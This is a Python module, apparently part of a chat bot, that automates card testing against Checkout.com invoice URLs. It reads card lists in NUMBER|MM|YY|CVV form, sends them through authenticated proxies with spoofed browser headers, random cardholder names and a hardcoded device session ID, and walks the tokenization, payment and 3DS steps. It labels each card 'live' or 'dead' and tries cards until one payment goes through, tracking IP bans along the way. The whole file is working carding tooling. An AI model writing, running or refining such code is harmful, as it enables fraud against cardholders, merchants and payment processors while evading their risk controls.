#!/usr/bin/env python3
"""
Checkout.com Auto-Checkout Integration for Mady Bot
Allows users to submit invoice URLs and automatically tries approved cards
"""

import requests
import re
import json
import random
import string
import time
from typing import Dict, List, Optional, Tuple

def random_name(length=8):
    """Generate random name for checkout"""
    return ''.join(random.choices(string.ascii_letters, k=length))

def parse_card(card_string: str) -> Optional[Dict[str, str]]:
    """
    Parse card string in format: NUMBER|MM|YY|CVV
    Returns dict with cc, mes1, ano, cvv or None if invalid
    """
    try:
        parts = re.split(r'[\|:;,\s]+', card_string.strip())
        if len(parts) < 4:
            return None
        
        return {
            "cc": parts[0],
            "mes1": str(int(parts[1])),  # Remove leading zeros
            "ano": parts[2],
            "cvv": parts[3]
        }
    except Exception:
        return None

def get_proxy_dict(proxy_str: str) -> Dict[str, str]:
    """
    Convert proxy string (host:port:user:pass) to requests proxy dict
    """
    try:
        host, port, user, pwd = proxy_str.strip().split(":")
        proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        return {"http": proxy_url, "https": proxy_url}
    except Exception:
        return {}

class CheckoutProcessor:
    """Handles Checkout.com payment processing"""
    
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = get_proxy_dict(proxy) if proxy else {}
        self.headers1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        self.headers2 = {
            "origin": "https://checkout-web-components.checkout.com",
            "referer": "https://checkout-web-components.checkout.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "content-type": "application/json"
        }
    
    def check_card(self, card_string: str, invoice_url: str) -> Tuple[str, str]:
        """
        Check a single card against the invoice URL
        
        Returns:
            Tuple of (status, message)
            status: "live", "dead", "error", "voided", "banned"
            message: Detailed result message
        """
        try:
            # Parse card
            card = parse_card(card_string)
            if not card:
                return "error", "Invalid card format"
            
            # Step 1: GET invoice page to extract session and pk
            try:
                r1 = requests.get(invoice_url, headers=self.headers1, proxies=self.proxy, timeout=30)
            except requests.exceptions.Timeout:
                return "error", "Timeout accessing invoice"
            except Exception as e:
                return "error", f"Network error: {str(e)[:50]}"
            
            # Extract payment session and public key
            sess_match = re.search(r'payment_session\\":{\\"id\\":\\"(.*?)\\",', r1.text)
            pk_match = re.search(r'"pk\\":\\"(.*?)\\",', r1.text)
            
            if not sess_match or not pk_match:
                return "error", "Failed to parse session/pk from invoice"
            
            sess = sess_match.group(1)
            pk = pk_match.group(1)
            
            # Step 2: POST to /tokens to tokenize card
            random_name_val = random_name(random.randint(7, 12))
            payload2 = {
                "type": "card",
                "expiry_month": card["mes1"],
                "expiry_year": card["ano"],
                "number": card["cc"],
                "name": random_name_val,
                "consumer_wallet": {}
            }
            
            try:
                r2 = requests.post(
                    "https://card-acquisition-gateway.checkout.com/tokens",
                    headers=self.headers2,
                    data=json.dumps(payload2),
                    proxies=self.proxy,
                    timeout=30
                )
            except requests.exceptions.Timeout:
                return "error", "Timeout during tokenization"
            except Exception as e:
                return "error", f"Tokenization error: {str(e)[:50]}"
            
            # Extract BIN and token
            bin_match = re.search(r'bin":"(.*?)",', r2.text)
            tok_match = re.search(r'token":"(.*?)","', r2.text)
            
            if not bin_match or not tok_match:
                return "error", "Failed to tokenize card"
            
            bin_val = bin_match.group(1)
            tok = tok_match.group(1)
            
            # Step 3: POST to /payment-sessions/<sess>/submit
            url3 = f"https://api.checkout.com/payment-sessions/{sess}/submit"
            payload3 = {
                "type": "card",
                "card_metadata": {"bin": bin_val},
                "source": {"token": tok},
                "risk": {"device_session_id": "dsid_hjdic5huud7urgk3uhknuyi26u"},
                "session_metadata": {
                    "internal_platform": {"name": "CheckoutWebComponents", "version": "1.142.0"},
                    "feature_flags": [
                        "analytics_observability_enabled", "card_fields_enabled",
                        "get_with_public_key_enabled", "logs_observability_enabled",
                        "risk_js_enabled", "use_edge_gateway_fastly_endpoint",
                        "use_non_bic_ideal_integration"
                    ],
                    "experiments": {}
                }
            }
            
            try:
                r3 = requests.post(url3, headers=self.headers2, data=json.dumps(payload3), proxies=self.proxy, timeout=30)
            except requests.exceptions.Timeout:
                return "error", "Timeout during payment submission"
            except Exception as e:
                return "error", f"Payment submission error: {str(e)[:50]}"
            
            # Check for invoice voided
            if "payment_attempts_exceeded" in r3.text:
                return "voided", "Invoice voided (too many attempts)"
            
            # Check for declined
            if "declined" in r3.text.lower():
                return "banned", "Email or IP banned"
            
            # Extract 3DS URL
            url_3ds_match = re.search(r'"url": "(.*?)"', r3.text)
            if not url_3ds_match:
                return "banned", "No 3DS URL (likely banned)"
            
            url_3ds = url_3ds_match.group(1)
            
            # Step 4: GET 3DS page
            headers4 = {
                "origin": "https://checkout-web-components.checkout.com",
                "referer": url_3ds,
                "authorization": f"Bearer {pk}",
                "user-agent": self.headers2["user-agent"]
            }
            
            try:
                r4 = requests.get(url_3ds, headers=headers4, proxies=self.proxy, timeout=30)
            except requests.exceptions.Timeout:
                return "error", "Timeout during 3DS check"
            except Exception as e:
                return "error", f"3DS error: {str(e)[:50]}"
            
            # Extract session ID
            sid_match = re.search(r"sessionId: '([^']+)',", r4.text)
            if not sid_match:
                return "error", "Failed to parse 3DS sessionId"
            
            sid = sid_match.group(1)
            
            # Step 5: GET 3DS status
            url6 = f"https://api.checkout.com/3ds/{sid}?M=h"
            headers6 = {
                "origin": "https://api.checkout.com",
                "referer": url6,
                "authorization": f"Bearer {pk}",
                "user-agent": self.headers2["user-agent"]
            }
            
            try:
                r6 = requests.get(url6, headers=headers6, proxies=self.proxy, timeout=120)
            except requests.exceptions.Timeout:
                return "error", "Timeout during 3DS status check"
            except Exception as e:
                return "error", f"3DS status error: {str(e)[:50]}"
            
            # Check final result
            if '"redirect_reason":"failure"' in r6.text:
                return "dead", "Card declined by issuer"
            else:
                return "live", "✅ Payment successful!"
        
        except Exception as e:
            return "error", f"Unexpected error: {str(e)[:100]}"

def process_checkout(invoice_url: str, cards: List[str], proxy: Optional[str] = None, 
                     callback=None, stop_check=None) -> Dict:
    """
    Process checkout with multiple cards until one succeeds
    
    Args:
        invoice_url: The invoice/checkout URL
        cards: List of card strings (NUMBER|MM|YY|CVV)
        proxy: Optional proxy string (host:port:user:pass)
        callback: Optional callback function(card, status, message) for progress updates
        stop_check: Optional function that returns True if processing should stop
    
    Returns:
        Dict with results:
        {
            "success": bool,
            "successful_card": str or None,
            "total_tried": int,
            "results": List of (card, status, message) tuples
        }
    """
    processor = CheckoutProcessor(proxy)
    results = []
    successful_card = None
    
    for i, card in enumerate(cards, 1):
        # Check if we should stop
        if stop_check and stop_check():
            break
        
        # Try the card
        status, message = processor.check_card(card, invoice_url)
        results.append((card, status, message))
        
        # Call callback if provided
        if callback:
            callback(card, status, message, i, len(cards))
        
        # If successful, stop trying
        if status == "live":
            successful_card = card
            break
        
        # If invoice voided, stop trying
        if status == "voided":
            break
        
        # Small delay between attempts
        time.sleep(1)
    
    return {
        "success": successful_card is not None,
        "successful_card": successful_card,
        "total_tried": len(results),
        "results": results
    }

# Example usage
if __name__ == "__main__":
    # Test with sample data
    test_invoice = "https://example.com/invoice/test"
    test_cards = [
        "4242424242424242|12|25|123",
        "5555555555554444|12|25|456"
    ]
    
    def progress_callback(card, status, message, current, total):
        print(f"[{current}/{total}] {card[:4]}**** - {status}: {message}")
    
    result = process_checkout(test_invoice, test_cards, callback=progress_callback)
    print(f"\nFinal Result: {result}")
